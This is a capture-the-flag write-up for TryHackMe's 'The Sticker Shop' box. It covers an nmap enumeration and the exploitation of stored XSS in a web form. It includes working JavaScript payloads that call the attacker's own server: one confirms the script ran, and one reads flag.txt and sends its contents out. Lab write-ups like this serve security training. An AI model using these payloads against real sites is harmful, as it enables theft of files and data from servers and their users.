# Writeup: The Sticker Shop

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Sat Sep 13 14:06:03 2025 as: /usr/lib/nmap/nmap --privileged -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.10.205.224
Nmap scan report for 10.10.205.224
Host is up, received user-set (0.087s latency).
Scanned at 2025-09-13 14:06:04 CEST for 106s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 99:64:f8:1c:aa:3d:9a:e5:8c:92:24:8b:48:23:70:9c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDg85maT/0S+UUoq1bVeLvAmimJ8bgC2Vuk+wd9aqunBXnkaoYJlZIMg8Lok/LGm2grKgplArBxZY040MFY7VtMdq+We4JuSHxLxhoZ3PV/wmMVhmq2jFCHn9yGuVLfBhM9ZdINmt1m6qc+kALnu5jsr+RmS5kTvMBL5mO5ynhG577rN86ThqV9ddgSLTZlaz8b6H6KEjtv3inzwcMvDh8e7uc/4WqrJTSXzYjn8oCZjCtsZ2Nc6mX1dNOPDyG20aAt+lcQhrrPHSdNC/AVbp3uOP8NL7ZnFBebbv6uuQrmT7vyplUlF8Or1cQnDGiQN2i/6XeOfuTwzEkfcBxWseZYM2qBwwMOgXnfnTW75TkhB7sylckWFePkNxuSOslR9t0ZnnzLjnRYc3/e+b3x6XNHFfTAOBr+ot4vnC+wbRIgJKju7F9pwHIRwPRRPaQrU14ibujB2Cjga4FN8NDQZQ5C3r5npQQRNE0shzY0E8f0r24Mh2Pp4oEnE9PyUPf+JGU=
|   256 d9:c9:d2:b8:2c:45:dd:af:ed:36:a8:cd:b0:e1:70:06 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIvGw+fmmmwfk0AvU3ljp+t0r2t8XtplOZ6raAfmf0xrsmIp0JG7rFvxABW1veu4JK5NFaRB7780eYZCjp+RTDw=
|   256 ab:15:ec:c1:b3:75:93:2e:fa:3b:61:e5:d9:f7:44:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK+G2SuY/V4/m/V1JtcE/Ib/PLY9tQjAB9WxPNqia8m+
8080/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.0.1 (Python 3.8.10)
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
|_http-title: Cat Sticker Shop
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 13 14:07:50 2025 -- 1 IP address (1 host up) scanned in 106.81 seconds
```

## 💥 Exploitation:

On port 8080 i found a webserver on wich i found a formfield. By testing some payloads i get nothing reflected so i tried a javascript payload to check for stored xss and started a listener on my machibne.

```html
<script>fetch(http://10.10.10.10:8000/test);</script>
```

After a few seconds i get some requests back on my machine so stored xss is verified.

```shell
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.205.224 - - [13/Sep/2025 14:12:19] code 404, message File not found
10.10.205.224 - - [13/Sep/2025 14:12:19] "GET /test HTTP/1.1" 404 -
```

Since the description of the box says we have to read `flag.txt` in the webroot its time to craft a javascript payload that reads the file and sends its conntent back to our webserver.

```html
<script>
const path = "flag.txt";
const xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
        const content = encodeURIComponent(this.responseText);
        const sendTo = "http://10.10.10.10?content=" + content;
        const sendReq = new XMLHttpRequest();
        sendReq.open("GET", sendTo, true);
        sendReq.send();
    }
};

xhttp.open("GET", path, true);
xhttp.send();
</script>
```

After a few seconds we get our flag.

```shell
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.131.234 - - [13/Sep/2025 14:35:12] "GET /?content=THM%7B83789a69074f636f64a38879cfcabe**********%7D HTTP/1.1" 200 -
```

## 🔓 Priviledge Escalation:

none

## 💰 Loot:

```shell
# flag.txt
THM{83789a69074f636f64a38879cfcabe**********}
```